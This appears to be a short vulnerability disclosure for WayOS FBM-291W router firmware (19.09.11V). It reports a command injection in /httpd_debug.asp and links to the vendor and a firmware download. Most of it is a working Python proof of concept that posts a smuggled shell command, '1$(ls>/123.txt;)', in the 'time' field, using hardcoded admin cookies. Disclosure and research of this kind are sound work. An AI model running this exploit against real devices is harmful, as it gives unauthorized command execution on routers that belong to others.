# FBM-291W-19.09.11V **Command Injection**

## Firmware information

- Manufacturer's address: https://www.wayos.com/
- Firmware download address: https://drive.weixin.qq.com/s?k=ANgAJAcRAAcJQcZsqk#/preview?fileId=s.1970324955538648.649217589iNQ_f.677141204X86O

## Affected version

![1](https://gitee.com/blogyoulin/img/raw/master/images/202307061654721.png)

## Vulnerability details

![image-20230707094355515](https://gitee.com/blogyoulin/img/raw/master/images/202307070943680.png)In /httpd_debug.asp, There is command injection

## Poc

```
import requests
from pwn import *

cmd=b"echo success_pwn_it"

#payload=b'http://'+b'A'*0x1000
payload=b'1$(ls>/123.txt;)'

url = "http://192.168.0.1/httpd_debug.asp"
cookie={"Cookie":"language=zh; userid=root; gw_userid=root,gw_passwd=94B830FE0CCD890946AE1C8318A2BE7B"}
data = {"time": payload}
response = requests.post(url,cookies=cookie,data=data)
#response = requests.post(url,cookies=cookie,data=data)
print(response.text)
```
